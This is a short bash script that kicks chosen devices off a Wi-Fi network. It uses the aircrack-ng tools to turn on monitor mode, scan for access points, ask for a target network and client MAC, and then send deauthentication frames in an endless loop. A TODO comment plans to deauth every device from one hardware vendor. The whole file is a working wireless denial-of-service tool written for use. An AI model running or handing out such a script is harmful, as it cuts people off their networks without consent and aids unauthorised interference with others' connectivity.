#!/bin/bash
#Description: Kick/deauth machines from your wifi network
#TODO: anti-hipster mode, find and deauth all E0:F8:47:* addresses
#Another method to find MACs on LAN is to run arp-scan -I $iface --localnet

USAGE="USAGE: $(basename $0) [interface]"
iface="$1"
R="\033[00;31m"
G="\033[00;32m"
NC="\033[00m"


#Check for root
if [ $(whoami) != "root" ]
    then echo -e "$R You must have root to run this script. $NC"
    exit 1
fi

#Check command-line params
if [ "$iface" = "" ]; then echo "$USAGE"; exit 1; fi

function _exit() {
	echo -e "$G Disabling monitor mode... $NC"
	airmon-ng stop mon0
	exit $1
}

##########################################################

echo  "░▄▀▄░▄▀▄░▀▀▄░░░░█░█░▀█▀░█▀▀░█░█░█▀▄░█▀█░█▀█"
echo  "░▄▀▄░█/█░▄▀░░░░░█▀▄░░█░░█░░░█▀▄░█▀▄░█▀█░█░█"
echo  "░░▀░░░▀░░▀▀▀░▀░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀░░▀░▀░▀░▀"

echo -e "$G Disabling network-manager... $NC"
service network-manager stop >/dev/null

echo -e "$G Enabling monitor mode on $iface... $NC"
airmon-ng start wlan0 >/dev/null

echo -ne "$G Scanning da radio. Press TAB to see associated stations. Press Ctrl+C to continue. 3..."; sleep 1
echo -ne "2..."; sleep 1
echo -ne "1... $NC"; sleep 1
airodump-ng -i mon0

echo -ne "$G AP ESSID to target? (blank to target AP by BSSID) $NC"; read ap_essid
if [ "$ap_essid" = "" ]; then echo -ne "$G AP BSSID to target? $NC"; read  ap_bssid; fi
if [[ "$ap_essid" = "" && "$ap_bssid" = "" ]]; then echo -e "$R No target AP specifed, aborting. $NC"; _exit 1; fi

echo -ne "$G Target MAC? $NC"; read target_mac
if [ "$target_mac" = "" ]; then echo "$R No target MAC specified, aborting. $NC"; _exit 1; fi

echo -ne "$G Blasting deauth at $target_mac on $ap_essid $ap_bssid ... $NC"; sleep 1
if [ "$ap_essid" != "" ];
	then while true; do  aireplay-ng -0 1 -e "$ap_essid" -c "$target_mac" mon0; done
	else while true; do  aireplay-ng -0 1 -a "$ap_bssid" -c "$target_mac" mon0; done
fi